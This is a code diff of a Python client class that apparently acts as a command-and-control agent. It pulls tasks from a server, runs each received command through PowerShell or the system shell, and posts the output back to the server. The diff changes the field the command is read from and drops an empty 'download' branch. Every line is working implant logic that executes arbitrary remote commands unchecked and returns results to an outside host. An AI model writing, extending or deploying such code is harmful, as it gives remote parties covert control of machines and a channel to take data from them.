@@ -37,7 +37,7 @@ class Client:
             if self.debug:
                 print("Executing task:",task)
             if task == "command":
-                command = task_json.get('command')
+                command = task_json.get('input')
                 if platform.system() == "Windows":
                     ps = subprocess.run("powershell -c " + command, shell=True, capture_output=True, text=True, timeout=60, check=True)
                 else:
@@ -46,8 +46,6 @@ class Client:
                 if self.debug:
                     print("Sending result back to server:",data)
                 req = requests.post(f"{self.protocol}{self.server_ip}:{self.port}/results", json=data)
-            elif task == "download":
-                pass
             else:
                 raise ValueError("Invalid task type")
         except subprocess.CalledProcessError as e:
